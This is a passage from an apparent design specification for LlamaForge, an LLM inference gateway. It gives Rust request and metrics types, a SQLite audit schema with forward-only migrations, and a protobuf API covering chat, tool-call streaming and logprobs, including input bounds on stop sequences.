> **[IR-1/IR-6] Newtype design note:** All identity types (`RequestId`, `ServerId`, `EventId`) SHOULD be newtypes (`pub struct RequestId(Uuid)`, `pub struct ServerId(Arc<str>)`) rather than type aliases. This prevents ID transposition bugs at compile time — passing a `ServerId` where a `RequestId` is expected becomes a type error rather than a silent logic bug. Derive `Debug, Clone, Hash, Eq, PartialEq, Serialize, Deserialize` via a macro to minimize boilerplate. The `#[must_use]` attribute on `DispatchToken` prevents accidental immediate drops (e.g., `DispatchToken::new(...)` without binding to a variable silently leaks a slot reservation). The type alias is retained in v1.0 for implementation velocity; migration to newtypes is tracked for v1.1.

/// Task type determines base priority
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq, Hash)]
#[serde(rename_all = "snake_case")]
pub enum TaskType {
    Emergency,
    RealtimeChat,
    CodeGeneration,
    CodeReview,
    Summarization,
    BatchAnalysis,
    Embedding,
    Background,
    Backfill,
    Custom(String),
    // Custom(String) priority: looked up in priority_rules.toml [custom_task_types] table.
    // If the custom type is not defined, base_priority defaults to 0 (lowest possible)
    // and a warning is logged on first occurrence: "Unknown custom task type '{name}',
    // using base_priority=0. Define it in [custom_task_types] to assign a priority."
    //
    // Prometheus label cardinality: Custom(String) is NOT used directly as a Prometheus
    // label. Like requestor → requestor_class, raw task_type is mapped to a bounded
    // task_type_class enum for Prometheus labels. Built-in variants map to themselves.
    // Custom types map to "custom" unless explicitly mapped in priority_rules.toml
    // [task_type_classes]. This prevents unbounded cardinality from arbitrary client strings.
    // The raw task_type string is stored in SQLite request_metrics.task_type for per-request
    // querying — only the Prometheus label is bounded.
}

/// Request status through its lifecycle
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "snake_case")]
pub enum RequestStatus {
    Queued,
    Dispatched,
    Generating,
    Completed,
    Failed,
    Evicted,
    Cancelled,
    Timeout,
}

/// Extended metadata attached to every inference request
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RequestMetadata {
    pub request_id: RequestId,
    pub task_type: TaskType,
    pub requestor: String,
    pub explicit_priority: Option<u32>,
    pub queue_timeout_secs: u32,
    pub lora_adapter: Option<String>,  // LoRA adapter name; hard routing constraint
}

/// The full internal representation of a queued request
#[derive(Debug, Clone)]
pub struct QueuedRequest {
    pub metadata: RequestMetadata,
    pub payload: InferencePayload,
    pub effective_priority: u32,
    pub enqueued_at: DateTime<Utc>,
    /// [IR-11] Monotonic timestamp for internal timing (starvation boost, grace periods).
    /// `DateTime<Utc>` above is for serialization (audit log, API responses) only.
    /// Starvation boost uses `enqueued_at_mono.elapsed()`, ensuring NTP corrections
    /// cannot produce negative boost values or time-travel artifacts.
    pub enqueued_at_mono: Instant,
    pub starvation_boost: u32,
    pub eviction_count: u32,
    pub status: RequestStatus,
}

/// The inference payload (OpenAI-compatible format)
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct InferencePayload {
    pub model: String,
    pub messages: Option<Vec<ChatMessage>>,    // for chat completions
    pub prompt: Option<String>,                 // for text completions
    pub max_tokens: Option<u32>,
    pub temperature: Option<f64>,
    pub top_p: Option<f64>,
    pub stream: bool,
    pub stop: Option<Vec<String>>,
    // ... other OpenAI-compatible fields
}

/// Per-request metrics record, stored in SQLite
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RequestMetrics {
    pub request_id: RequestId,
    pub model_name: String,
    pub server_id: Option<String>,   // None for requests cancelled during queue wait (never dispatched)
    pub slot_id: Option<u32>,        // None for requests cancelled during queue wait. Option avoids
                                      // ambiguity with slot 0 (a valid slot index).
    pub task_type: TaskType,
    pub requestor: String,
    pub effective_priority: u32,

    // Timing
    pub received_at: DateTime<Utc>,
    pub dispatched_at: Option<DateTime<Utc>>,
    pub first_token_at: Option<DateTime<Utc>>,
    pub completed_at: Option<DateTime<Utc>>,

    // Derived timing (milliseconds)
    pub queue_wait_ms: f64,
    pub ttft_ms: Option<f64>,
    pub generation_duration_ms: Option<f64>,
    pub total_latency_ms: f64,

    // Token counts
    pub prompt_tokens: u32,
    pub completion_tokens: u32,

    // Throughput
    pub prompt_tps: Option<f64>,
    pub generation_tps: Option<f64>,

    // Status
    pub status: RequestStatus,
    pub finish_reason: Option<FinishReason>,  // None for requests still in-flight; set on terminal state.
                                               // Persisted to SQLite for retry-domain analytics:
                                               // CLIENT_DISCONNECT vs UPSTREAM_FAILURE vs STOP vs LENGTH etc.
    pub was_evicted: bool,
    pub eviction_count: u32,
    pub error_message: Option<String>,
}
```

### 6.2 SQLite Schema

```sql
-- Per-request metrics (the core audit table)
CREATE TABLE request_metrics (
    request_id          TEXT PRIMARY KEY,
    model_name          TEXT NOT NULL,
    server_id           TEXT,            -- NULL for requests cancelled during queue wait (never dispatched)
    slot_id             INTEGER,         -- NULL for requests cancelled during queue wait
    task_type           TEXT NOT NULL,
    requestor           TEXT NOT NULL,
    effective_priority  INTEGER NOT NULL,

    received_at         TEXT NOT NULL,  -- ISO 8601
    dispatched_at       TEXT,
    first_token_at      TEXT,
    completed_at        TEXT,

    queue_wait_ms       REAL NOT NULL DEFAULT 0,
    ttft_ms             REAL,
    generation_duration_ms REAL,
    total_latency_ms    REAL NOT NULL DEFAULT 0,

    prompt_tokens       INTEGER NOT NULL DEFAULT 0,
    completion_tokens   INTEGER NOT NULL DEFAULT 0,
    prompt_tps          REAL,
    generation_tps      REAL,

    status              TEXT NOT NULL,
    finish_reason       TEXT,            -- FinishReason enum: 'stop', 'length', 'error',
                                         -- 'tool_calls', 'client_disconnect', 'upstream_failure'.
                                         -- NULL for requests still in-flight at crash time.
                                         -- Critical for retry-domain analytics (see Section 7.0).
    was_evicted         INTEGER NOT NULL DEFAULT 0,
    eviction_count      INTEGER NOT NULL DEFAULT 0,
    error_message       TEXT
);

-- Indices for common query patterns
CREATE INDEX idx_request_metrics_model ON request_metrics(model_name);
CREATE INDEX idx_request_metrics_task_type ON request_metrics(task_type);
CREATE INDEX idx_request_metrics_requestor ON request_metrics(requestor);
CREATE INDEX idx_request_metrics_received ON request_metrics(received_at);
CREATE INDEX idx_request_metrics_status ON request_metrics(status);
CREATE INDEX idx_request_metrics_finish_reason ON request_metrics(finish_reason) WHERE finish_reason IS NOT NULL;
CREATE INDEX idx_request_metrics_server ON request_metrics(server_id) WHERE server_id IS NOT NULL;
-- Per-server metric queries (Web UI Server Management, per-server throughput/error rate
-- aggregation) require WHERE server_id = ? — without this index, these queries trigger
-- full table scans on a table that grows daily.

-- SQLite performance tuning (applied at connection open)
-- PRAGMA journal_mode=WAL;
-- PRAGMA wal_autocheckpoint=1000;
-- PRAGMA synchronous=NORMAL;
-- PRAGMA busy_timeout=5000;

-- WAL size management (applied at connection open)
-- PRAGMA wal_autocheckpoint=1000;  -- (already set above) Checkpoint after 1000 pages (~4MB)

-- Event log (audit trail)
-- Uses UUIDv7 event_id as PK for collision-free inserts at any write rate.
-- The _system_ sentinel is removed; request_id is nullable for non-request events.
CREATE TABLE events (
    event_id    TEXT PRIMARY KEY,  -- UUIDv7 (guaranteed unique per event)
    timestamp   TEXT NOT NULL,     -- ISO 8601 with microsecond precision
    event_type  TEXT NOT NULL,
    request_id  TEXT,              -- NULL for server-level events (server.started, etc.)
    server_id   TEXT,
    details     TEXT               -- JSON blob
);

CREATE INDEX idx_events_type ON events(event_type);
CREATE INDEX idx_events_request ON events(request_id) WHERE request_id IS NOT NULL;
CREATE INDEX idx_events_time ON events(timestamp);
CREATE INDEX idx_events_server ON events(server_id) WHERE server_id IS NOT NULL;

-- Server configuration snapshots
CREATE TABLE server_configs (
    server_id   TEXT NOT NULL,
    timestamp   TEXT NOT NULL,
    config      TEXT NOT NULL,  -- TOML snapshot
    PRIMARY KEY (server_id, timestamp)
);

-- Config overlay store (v1.1+ — see Section 13.3)
-- Runtime overrides persisted separately from the immutable TOML base config.
-- Keys are dotted paths into the Config struct (e.g., "servers.codellama-7b.priority_class").
CREATE TABLE config_overlays (
    key         TEXT PRIMARY KEY,
    value_json  TEXT NOT NULL,    -- Serialized serde_json::Value
    updated_at  TEXT NOT NULL     -- ISO 8601
);

-- Managed process tracking (for orphan recovery — see Section 14)
-- Records PIDs of llama-server child processes so LlamaForge can reclaim
-- them after a gateway restart.
CREATE TABLE managed_processes (
    pid         INTEGER PRIMARY KEY,
    server_id   TEXT NOT NULL,      -- Config-defined server ID (e.g., "llama-8b-gpu0")
    port        INTEGER NOT NULL,   -- HTTP port the llama-server is listening on
    started_at  TEXT NOT NULL,       -- ISO 8601 — audit trail (process start timestamp for operational forensics; PID reuse detection uses /proc/{pid}/comm + port/model matching, not this column)
    model_path  TEXT NOT NULL        -- Model file path — used for config matching during reclaim
);

CREATE INDEX idx_managed_processes_server ON managed_processes(server_id);
```

**Schema Migration Strategy:**

SQLite schema changes across binary updates are managed by embedded forward-only migrations using the `rusqlite_migration` crate. On startup, before opening the gRPC or HTTP ports, LlamaForge:

1. Opens the SQLite database.
2. **Downgrade guard:** Checks `PRAGMA user_version` against the binary's `MAX_MIGRATION_VERSION`. If the stored version is higher than the binary's max known migration (i.e., a newer binary previously ran against this database), LlamaForge panics with: `"Database schema version {stored} is newer than this binary (max {max}). Refusing to start — upgrade the binary or restore a database backup."` This prevents a rolled-back binary from silently corrupting data by writing to columns or tables it doesn't understand.
3. Runs any unapplied migrations in sequence (each migration is an idempotent SQL script embedded in the binary at compile time).
4. If a migration fails, LlamaForge logs the error and refuses to start — it does not attempt to serve requests with an inconsistent schema.

Migrations are strictly forward-only (no rollback). To revert a schema change, the operator must deploy a new binary with a corrective migration. The current schema version is exposed via `GET /api/config` and `llamaforge_schema_version` Prometheus gauge.

---

## 7. API Specification

### 7.0 Protocol Buffers Definition

The canonical API is defined in protobuf. All gRPC and HTTP/JSON interactions derive from these definitions.

```protobuf
syntax = "proto3";
package llamaforge.v1;

import "google/protobuf/timestamp.proto";
import "google/protobuf/duration.proto";

// ============================================================
// Common Types
// ============================================================

enum TaskType {
  TASK_TYPE_UNSPECIFIED = 0;
  TASK_TYPE_EMERGENCY = 1;
  TASK_TYPE_REALTIME_CHAT = 2;
  TASK_TYPE_CODE_GENERATION = 3;
  TASK_TYPE_CODE_REVIEW = 4;
  TASK_TYPE_SUMMARIZATION = 5;
  TASK_TYPE_BATCH_ANALYSIS = 6;
  TASK_TYPE_EMBEDDING = 7;
  TASK_TYPE_BACKGROUND = 8;
  TASK_TYPE_BACKFILL = 9;
}

enum FinishReason {
  FINISH_REASON_UNSPECIFIED = 0;
  FINISH_REASON_STOP = 1;           // Normal completion (stop token or stop sequence matched)
  FINISH_REASON_LENGTH = 2;         // Hit max_tokens limit
  FINISH_REASON_ERROR = 3;          // Unrecoverable model/server error (e.g., CUDA OOM during generation)
  FINISH_REASON_TOOL_CALLS = 4;     // Model produced one or more tool calls
  FINISH_REASON_CLIENT_DISCONNECT = 5;  // Client dropped TCP connection, read timeout, or
                                         // queue_timeout exceeded. The failure is on the client
                                         // side — retrying with the same request is appropriate.
  FINISH_REASON_UPSTREAM_FAILURE = 6;   // Backend shutdown (graceful drain), backend crash,
                                         // network partition, or deadlock-triggered SIGKILL.
                                         // The failure is on the cluster side — the client's
                                         // request was valid and should be retried immediately.
}

// Retry semantics by finish reason:
//   STOP, LENGTH, TOOL_CALLS → success; no retry needed
//   ERROR                    → do NOT retry (model-level failure, same request will fail again)
//   CLIENT_DISCONNECT        → client-side issue; retry only if the client is still interested
//   UPSTREAM_FAILURE         → cluster-side issue; retry immediately (request was valid)
//
// The OpenAI HTTP shim maps both CLIENT_DISCONNECT and UPSTREAM_FAILURE to
// finish_reason: "stop" in the terminal SSE chunk (see Mid-stream error format
// in Section 7.2) because the OpenAI spec's finish_reason enum is closed.
// The llamaforge.error extension field carries the actual reason for
// LlamaForge-aware clients.

// ============================================================
// Grammar Constraints / Structured Output
// ============================================================

message ResponseFormat {
  oneof format {
    ResponseFormatText text = 1;
    ResponseFormatJsonObject json_object = 2;
    ResponseFormatJsonSchema json_schema = 3;
  }
}

message ResponseFormatText {}                // Default free-form text output

message ResponseFormatJsonObject {}          // Constrain output to valid JSON

message ResponseFormatJsonSchema {
  string name = 1;                           // Schema name (for logging/debugging)
  string schema = 2;                         // JSON Schema string
  bool strict = 3;                           // If true, output must match exactly
}

message RequestMetadata {
  string request_id = 1;       // UUIDv7, auto-generated if empty
  TaskType task_type = 2;      // Determines base priority
  string requestor = 3;        // Identity of calling service/user
  optional uint32 priority = 4; // Explicit priority override (0-1000)
  optional google.protobuf.Duration queue_timeout = 5; // Max wait; maps to gRPC deadline if unset
  optional string lora_adapter = 6; // LoRA adapter name; request is routed only to servers with this adapter loaded
}

message ChatMessage {
  string role = 1;             // "system", "user", "assistant", "tool"
  // Simple text content (convenience shorthand for a single text part)
  string content = 2;
  // Multimodal content array (OpenAI-compatible). When set, `content` is ignored.
  repeated ContentPart parts = 3;
  // Tool/function-calling fields
  repeated ToolCall tool_calls = 4;   // Present when role="assistant" and model invokes tools
  string tool_call_id = 5;            // Present when role="tool" (result of a tool call)
}

// Multimodal content part — mirrors the OpenAI content array format.
message ContentPart {
  oneof part {
    TextPart text = 1;
    ImageUrlPart image_url = 2;
    InputAudioPart input_audio = 3;
  }
}

message TextPart {
  string text = 1;
}

message ImageUrlPart {
  string url = 1;              // Data URI (base64) or HTTP URL
  string detail = 2;           // "auto", "low", "high"
}

message InputAudioPart {
  string data = 1;             // Base64-encoded audio
  string format = 2;           // "wav", "mp3", "flac", "opus"
}

// ============================================================
// Function Calling / Tool Use
// ============================================================

message FunctionDefinition {
  string name = 1;
  string description = 2;
  string parameters_schema = 3; // JSON Schema string defining the function's parameters
}

message ToolCall {
  string id = 1;               // Unique ID for this tool call
  string type = 2;             // "function"
  FunctionCallDetail function = 3;
}

message FunctionCallDetail {
  string name = 1;
  string arguments = 2;        // JSON string of arguments
}

message ToolCallResult {
  string tool_call_id = 1;
  string content = 2;          // The result returned by the tool
}

message UsageStats {
  uint32 prompt_tokens = 1;
  uint32 completion_tokens = 2;
  uint32 total_tokens = 3;
}

message RequestPerformanceMetrics {
  string request_id = 1;
  string server_id = 2;
  uint32 slot_id = 3;
  double queue_wait_ms = 4;
  double ttft_ms = 5;
  double generation_tps = 6;
  double prompt_tps = 7;
  double total_latency_ms = 8;
  bool was_evicted = 9;
  uint32 eviction_count = 10;
  optional double speculative_acceptance_rate = 11; // Accepted draft tokens / total (speculative servers only)
  optional double speculation_depth = 12;           // Avg accepted tokens per speculation step
}

// ============================================================
// Inference Service
// ============================================================

service InferenceService {
  // Server-side streaming: first message may be a queue update,
  // followed by token chunks, ending with a summary chunk.
  rpc ChatCompletion(ChatCompletionRequest) returns (stream ChatCompletionResponse);
  rpc TextCompletion(TextCompletionRequest) returns (stream TextCompletionResponse);
  rpc Embed(EmbedRequest) returns (EmbedResponse);
  rpc Rerank(RerankRequest) returns (RerankResponse);
}

// Extended sampling parameters beyond temperature/top_p.
// Maps to llama.cpp sampler chain and OpenAI-compatible fields.
message SamplingParams {
  optional uint32 top_k = 1;              // Top-K sampling (llama.cpp native; 0 = disabled)
  optional double min_p = 2;              // Min-P sampling threshold (llama.cpp native; 0.0 = disabled)
  optional double repeat_penalty = 3;     // Repetition penalty (llama.cpp native; 1.0 = disabled)
  optional double frequency_penalty = 4;  // OpenAI-compatible frequency penalty (-2.0 to 2.0)
  optional double presence_penalty = 5;   // OpenAI-compatible presence penalty (-2.0 to 2.0)
  optional int64 seed = 6;               // RNG seed for deterministic generation (-1 = random)
  optional bool logprobs = 7;            // Whether to return log probabilities
  optional uint32 top_logprobs = 8;      // Number of top logprobs per token (0-20)
  map<int32, float> logit_bias = 9;        // Token ID → bias adjustment (-100.0 to 100.0)
                                           // Key is int32 (not uint32) because llama_token is
                                           // int32_t — negative values are used for control
                                           // tokens (BOS, EOS, special tokens in some vocabs)
  optional uint32 n = 10;                // Number of completions (default: 1). **v1: rejected if != 1.** Absent or `n = 1`: single completion (default). `n = 0` or `n > 1`: rejected with `INVALID_ARGUMENT` (gRPC) / HTTP 400. `n = 0` is invalid per OpenAI spec (`n ≥ 1`); `n > 1` is deferred to v1.1. Silent clamping is an API anti-pattern — a client expecting 5 completions and receiving 1 will throw `IndexOutOfBounds`. Multi-completion support is deferred to v1.1.
}

message ChatCompletionRequest {
  RequestMetadata metadata = 1;
  string model = 2;
  repeated ChatMessage messages = 3;
  optional uint32 max_tokens = 4;
  optional double temperature = 5;
  optional double top_p = 6;
  repeated string stop = 7;              // Max 10 stop sequences (see validation rule 5 below)
  // When false, server collects all tokens and returns a single response message.
  // When true (default), tokens stream as they're generated.
  bool stream = 8;
  // Function calling / tool use
  repeated FunctionDefinition tools = 9;
  string tool_choice = 10;       // "none", "auto", or a specific function name
  // Grammar constraints / structured output
  // VALIDATION RULES (all enforced at request validation, before queueing):
  //   1. `grammar` and `response_format` are mutually exclusive.
  //      `grammar` provides raw GBNF constraint (llama.cpp native); `response_format`
  //      provides higher-level JSON schema constraint. LlamaForge validates that the
  //      schema is well-formed JSON but does NOT compile it to GBNF — llama-server
  //      handles schema-to-GBNF conversion internally via `json-schema-to-grammar.cpp`.
  //      The `json_schema` field is passed through to llama-server as-is.
  //      Sending both `grammar` and `response_format` creates an ambiguous constraint
  //      that cannot be resolved.
  //   2. `grammar` and `tools` are mutually exclusive. `response_format` and `tools` are
  //      mutually exclusive. (All three pairwise combinations are rejected.)
  //      Grammar/response_format constraints and tool-use both control the output format.
  //      `tools` compiles to an internal GBNF grammar in llama.cpp — supplying a custom
  //      grammar or JSON schema alongside tools creates an unresolvable constraint conflict
  //      (the custom constraint may prevent the model from emitting valid Jinja tool call
  //      syntax). llama-server does not support both simultaneously.
  //   3. `stream: true` and `tools` (non-empty): streaming tool calls use
  //      buffered-then-emit mode. See "Streaming Tool Calls" comment below.
  //   4. `stream_options` and `stream: false` are mutually exclusive.
  //      Per the OpenAI API spec, `stream_options` is only valid when `stream: true`.
  //      Passing `stream_options` on a non-streaming request is rejected with
  //      INVALID_ARGUMENT / HTTP 400: {"error": "stream_options requires stream: true"}.
  //   5. `stop` sequences are bounded: max 10 entries, each max 256 bytes.
  //      Unbounded stop sequences are a DoS vector: each stop sequence is compiled
  //      into llama-server's sampling pipeline and checked against every generated
  //      token. A malicious client sending thousands of stop sequences can saturate
  //      the sampling loop, effectively stalling generation for all requests on that
  //      server. The 10-sequence limit matches the OpenAI API's documented maximum.
  //      Individual sequence length is capped at 256 bytes to prevent memory
  //      amplification (each sequence is tokenized and stored per-request).
  // All violations are rejected with INVALID_ARGUMENT (gRPC) / HTTP 400 with a clear
  // error message identifying which fields conflict or which bounds are exceeded.
  string grammar = 11;           // GBNF grammar string (llama.cpp native constraint)
  ResponseFormat response_format = 12;
  // Extended sampling parameters
  optional SamplingParams sampling = 13;
  // Stream options (OpenAI-compatible)
  optional StreamOptions stream_options = 14; // Controls streaming behavior (e.g., include_usage)
}

// StreamOptions controls streaming behavior, matching the OpenAI API.
message StreamOptions {
  bool include_usage = 1;  // If true, the final streaming chunk includes a UsageStats
                           // message with prompt_tokens, completion_tokens, and total_tokens.
                           // This eliminates the need for clients to count tokens client-side
                           // or make a separate API call for usage data after streaming completes.
}

message ChatCompletionResponse {
  oneof response_type {
    QueueUpdate queue_update = 1;        // Position updates while queued
    EvictionNotice eviction_notice = 2;  // If evicted mid-generation
    TokenChunk chunk = 3;                // Generated token(s)
    CompletionSummary summary = 4;       // Final message with full metrics
  }
}

message QueueUpdate {
  uint32 position = 1;
  double estimated_wait_secs = 2;
}

message EvictionNotice {
  string reason = 1;
  uint32 requeue_position = 2;
  uint32 tokens_generated_before_eviction = 3;
}

message TokenChunk {
  string request_id = 1;
  string content = 2;                    // The generated text fragment
  optional FinishReason finish_reason = 3;
  // Attached on first chunk only:
  optional double ttft_ms = 4;
  repeated ToolCallChunk tool_call_chunks = 5; // Incremental tool call deltas (streaming)
  uint32 index = 6;                     // Completion index (always 0 in v1; required for n>1 multiplexed streams in v1.1)
  // HTTP shim injection: OpenAI streaming chunks include "created" (Unix timestamp) and
  // "id" ("chatcmpl-...") in every SSE event. These are NOT protobuf fields — the gRPC
  // representation omits them (request_id serves the correlation purpose). The HTTP shim
  // injects both when serializing to SSE: "created" is set to the request's received_at
  // timestamp (Unix seconds), and "id" is set to "chatcmpl-{request_id}".
                                        // Named `index` (not `choice_index`) to align with CompletionChoice.index
                                        // and the OpenAI `choices[].index` field — simplifies mapping logic.
  optional UsageStats usage = 7;        // Present on a DEDICATED TRAILING chunk (with empty choices array)
                                        // when StreamOptions.include_usage = true, per the OpenAI streaming
                                        // spec. The HTTP shim emits this as a separate SSE data line AFTER
                                        // the final chunk containing finish_reason. Contains prompt_tokens,
                                        // completion_tokens, and total_tokens. This two-chunk pattern is
                                        // required for compatibility with the OpenAI Python SDK (>= 1.0),
                                        // Rust async-openai, and Go go-openai — these clients parse the
                                        // final chunk structure rigidly and reject usage attached to a
                                        // chunk with a non-empty choices array.
}

message ToolCallChunk {
  uint32 index = 1;                // Index into the tool_calls array being built
  optional string id = 2;          // Tool call ID (present on FIRST chunk only for this index)
  optional string type = 3;        // "function" (present on FIRST chunk only)
  FunctionCallDelta function = 4;
  // CRITICAL: `id` and `type` MUST be `optional` (not bare `string`). In proto3,
  // a bare `string` field defaults to "" (empty string) when absent. The OpenAI SDK
  // expects `id` and `type` to be null/absent on subsequent chunks (only the first
  // chunk carries them). If the HTTP shim serializes `"id": ""` instead of omitting
  // the field, OpenAI-compatible clients (openai-python, litellm, etc.) will crash
  // or reject the chunk. With `optional`, proto3 generates `has_id()` / `has_type()`
  // presence checks, and the JSON serializer omits the field entirely when unset.
}

message FunctionCallDelta {
  optional string name = 1;        // Function name (present on FIRST chunk only)
  string arguments = 2;            // Incremental JSON fragment of arguments
  // `name` is also `optional` for the same reason: it is only present on the first
  // chunk for a given tool call. Subsequent chunks carry only `arguments` fragments.
}

// Forward-compatible choice wrapper for multi-completion (n > 1) in v1.1.
// In v1, `choices` always contains exactly one element. Wrapping content and
// finish_reason in a repeated message now prevents a wire-breaking change when
// v1.1 adds n > 1 support — changing top-level scalar fields to repeated later
// would break wire compatibility for v1 clients.
message CompletionChoice {
  uint32 index = 1;                     // Completion index (always 0 in v1)
  string content = 2;                   // Full text for this choice (empty when finish_reason=TOOL_CALLS)
  FinishReason finish_reason = 3;
  repeated ToolCall tool_calls = 4;     // Present when finish_reason=TOOL_CALLS
  optional ChoiceLogprobs logprobs = 5; // Per-token log probabilities for this choice.
                                        // Present only when SamplingParams.logprobs = true.
                                        // Maps to OpenAI `choices[].logprobs` in the HTTP shim.
}

// Log probability data for a non-streaming completion choice.
// Matches the OpenAI `logprobs` object structure for compatibility.
message ChoiceLogprobs {
  repeated TokenLogprob content = 1;    // One entry per generated token
}

message TokenLogprob {
  string token = 1;                     // The token string
  double logprob = 2;                   // Log probability of this token
  repeated TopLogprob top_logprobs = 3; // Top-N alternative tokens at this position
                                        // (N = SamplingParams.top_logprobs, max 20)
  bytes token_bytes = 4;               // Raw UTF-8 byte representation of the token
}

// Wire efficiency note: field 4 was changed from `repeated uint32` to `bytes`.
// Protobuf's `repeated uint32` uses varint encoding — each byte value (0-255) is
// encoded as 1-2 varint bytes plus a per-element tag, so a 4-byte UTF-8 token
// consumes 8-12 bytes on the wire. The `bytes` type encodes the same data as a
// length-prefixed blob: 1 byte tag + 1 byte length + N raw bytes = N+2 bytes total.
// For a 4-byte UTF-8 token: 6 bytes vs 8-12 bytes. At scale (thousands of tokens
// per response with logprobs enabled), this adds up. The OpenAI API returns this
// field as a JSON array of integers; the HTTP shim converts `bytes` → `Vec<u8>` →
// JSON array on output, and JSON array → `Vec<u8>` → `bytes` on input.

message TopLogprob {
  string token = 1;
  double logprob = 2;
  bytes token_bytes = 3;
}

message CompletionSummary {
  string request_id = 1;
  string model = 2;
  repeated CompletionChoice choices = 3; // v1: always exactly 1 element. v1.1+: one per completion (n elements).
  UsageStats usage = 4;
  RequestPerformanceMetrics metrics = 5; // Full per-request metrics
  // Delivery guarantee: CompletionSummary is sent as the final stream message only for
  // successful, fully-delivered streams where the client connection remains open. On client
  // disconnect, upstream failure, or eviction, no CompletionSummary is sent — the stream
  // terminates with the appropriate FinishReason on the last TokenChunk (or an error status).
  // The audit trail (SQLite request_metrics) records full metrics regardless of delivery.
  // Note: This is a greenfield v0.1.0 API with zero deployed clients.
  // Fields are numbered contiguously — no reserved gaps. Earlier drafts
  // had deprecated top-level aliases for choices[0] fields, but reserving
  // field numbers in an unreleased API ships technical debt on day one.
}

// Tool Call Aggregation (Unary Requests)
//
// For `stream: false` requests, `llama-server` emits tool calls as raw string
// output formatted by Jinja chat templates (e.g., `<tool_call>{"name": "get_weather",
// "arguments": {"city": "SF"}}</tool_call>`). The `InferenceEngine` intercepts the
// raw completion string when `finish_reason == "tool_calls"` and performs the following:
//
// 1. Parse the Jinja-templated output using a JSON extractor that handles the
//    model-specific tool call format (configured per chat template via the server's
//    Jinja template definition).
// 2. Construct strongly-typed `ToolCall` protobuf messages from the parsed JSON.
// 3. Populate `choices[0].tool_calls` with the parsed calls.
// 4. Set `choices[0].content = ""` to comply with the OpenAI API spec
//    (which expects content to be null/empty when tool calls are present).
//
// If the raw output cannot be parsed as valid tool calls (malformed JSON, unexpected
// template format), the `InferenceEngine` falls back to returning the raw string in
// `choices[0].content` with `finish_reason = FINISH_REASON_STOP` and logs a
// `tool_call.parse_failed` warning event. This prevents silent data loss — the client
// receives the model's raw output rather than an empty response.
//
// Streaming Tool Calls — Buffered-Then-Emit Mode
//
// For streaming requests with `tools` present, `llama-server` emits tool calls
// as raw Jinja-templated text interleaved with regular content tokens. Unlike
// OpenAI's API (which provides structured `tool_calls` deltas in each SSE chunk),
// llama-server's streaming output is unstructured text that must be accumulated
// and parsed as a complete string — the same as unary mode, but arriving
// token-by-token with no structural boundary markers.
//
// LlamaForge handles this via **bounded-lookahead buffered-then-emit**: when
// `stream: true` and `tools` are both present, the proxy task buffers the
// first N tokens (default: 20 tokens or first `\n`, whichever comes first)
// into a lookahead buffer. During this lookahead window, the proxy inspects
// the accumulated text for the model's Jinja tool call delimiter pattern.
//
// **If a tool call prefix is detected within the lookahead:** The proxy
// switches to full buffering mode — all remaining tokens are accumulated
// silently. When generation completes, the complete output is parsed using
// the model's Jinja template to extract structured tool calls. LlamaForge
// then emits reconstructed `ToolCallChunk` deltas to the client's SSE stream
// in the OpenAI/Anthropic-expected format, followed by `[DONE]`.
//
// **If NO tool call prefix is detected within the lookahead:** The proxy
// flushes the lookahead buffer to the client and switches to **passthrough
// streaming** for the remainder of the response. This bounds the worst-case
// TTFT addition to ~200ms (20 tokens at ~100 tok/s) while preserving real-time
// token delivery for the common case of non-tool responses.
//
// [G-14] A dedicated `llamaforge_tool_lookahead_overhead_ms` histogram tracks
// the actual delay imposed by the lookahead buffer (time from first backend
// token received to first token emitted to client). This enables operators to
// distinguish lookahead-induced TTFT from genuine prefill latency in dashboards.
// Buckets: [1, 5, 10, 25, 50, 100, 200, 500, 1000] ms.
//
// This approach has two implications:
//   1. **No incremental token delivery for tool call responses.** The client
//      sees no tokens until the entire tool call generation completes. This is
//      acceptable because tool call outputs are not incrementally useful — the
//      client needs the complete function name + arguments before invoking.
//   2. **SSE keepalives are critical during full buffering.** During the
//      buffering window (which can be several seconds for complex tool calls),
//      the client receives no data. The SSE keepalive mechanism (`: ping\n\n`
//      comments at sse_keepalive_interval_secs) prevents proxy/client timeout
//      during this silent buffering phase.
//
// If the model produces a mixed response (text content + tool calls), LlamaForge
// emits the text content tokens as they arrive (normal streaming), then buffers
// only the tool call portion once the Jinja tool call delimiter is detected.
//
// Rejected alternative: rejecting `stream: true` + `tools` entirely. An earlier
// design returned HTTP 400 for this combination. This breaks the Anthropic SDK
// (which defaults to streaming in agentic loops) and the OpenAI Python SDK's
// auto-streaming behavior, forcing callers to special-case LlamaForge. The
// buffered approach is invisible to clients — they receive the same structured
// ToolCallChunk deltas as any other streaming API, just with higher latency
// for the tool call portion.

// TextCompletion mirrors ChatCompletion but with prompt instead of messages.
// Same validation rules apply: stop sequences bounded to max 10 entries / 256 bytes each,
// grammar and response_format are mutually exclusive.
message TextCompletionRequest {
  RequestMetadata metadata = 1;
  string model = 2;
  string prompt = 3;
  optional uint32 max_tokens = 4;
  optional double temperature = 5;
  optional double top_p = 6;
  repeated string stop = 7;              // Max 10, each max 256 bytes (same as ChatCompletionRequest)
  bool stream = 8;
  // Grammar constraints / structured output (mutually exclusive — same rule as ChatCompletionRequest)
  string grammar = 9;           // GBNF grammar string (llama.cpp native constraint)
  ResponseFormat response_format = 10;
  // Extended sampling parameters
  optional SamplingParams sampling = 11;
}

message TextCompletionResponse {
  oneof response_type {
    QueueUpdate queue_update = 1;
    EvictionNotice eviction_notice = 2;
    TokenChunk chunk = 3;
    CompletionSummary summary = 4;
  }
}

message EmbedRequest {
  RequestMetadata metadata = 1;
  string model = 2;
  repeated string input = 3;    // The HTTP shim coerces single-string input ("input": "hello")
                                // to a one-element array (["hello"]) for OpenAI compatibility.
                                // OpenAI accepts both string and array forms; the protobuf
                                // definition uses `repeated string` as the canonical form.
}

message EmbedResponse {
  repeated EmbeddingResult embeddings = 1;
  UsageStats usage = 2;
  RequestPerformanceMetrics metrics = 3;
  uint32 dimensions = 4;             // Embedding vector dimensionality
}

message EmbeddingResult {
  uint32 index = 1;
  repeated float values = 2;
}

// ============================================================
// Model Info (used by ListModelsResponse and introspection)
// ============================================================

message ModelInfo {
  string name = 1;                   // Model alias (e.g., "llama-3.1-8b")
  uint64 parameter_count = 2;        // Approximate parameter count (0 if unknown)
  uint32 context_length = 3;         // Max context length (ctx_size)
